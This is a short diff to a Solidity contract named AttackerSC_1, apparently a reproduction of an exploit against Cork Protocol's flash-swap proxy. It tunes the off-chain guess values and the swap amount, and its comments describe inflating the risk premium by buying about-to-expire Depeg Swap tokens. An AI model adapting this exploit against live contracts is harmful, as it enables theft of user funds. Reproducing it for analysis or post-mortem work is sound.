@@ -68,13 +68,17 @@ contract AttackerSC_1 {
         buyParams.feeEpsilon = 1e9;
         buyParams.precisionBufferPercentage = 1e16;
 
-        // Sending an empty guess, incurrs in greater gas expenses. The attacker made some guesses.
+        /*
+         Guesses made with offchain calculations to inflate the risk premium
+         over 1,779.7 quadrillion percent by effectively buying 2.5e18 about-to-expire 
+         Depeg Swap (DS) tokens
+        */
         IPSMProxy.OffchainGuess memory offchainGuess;
-        offchainGuess.initialBorrowAmount = 2_035_043_806_577_874_200;
-        offchainGuess.afterSoldBorrowAmount = 2_554_953_564_824_393_000;
+        offchainGuess.initialBorrowAmount = 2e18;
+        offchainGuess.afterSoldBorrowAmount = 2.55e18;
 
-        // TODO: We need to identify how the attacker calculated the amount
-        flashSwapProxy.swapRaforDs(PAIR_ID_FOR_RATE, 1, 3_407_593_947_121_416, 0, buyParams, offchainGuess);
+        // The attacker paid only 0.003407 wstETH for the requested DS (RA)
+        flashSwapProxy.swapRaforDs(PAIR_ID_FOR_RATE, 1, 3.5e15, 0, buyParams, offchainGuess);
 
         // Step 1.7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
         wstETH.approve(address(flashSwapProxy), 0);
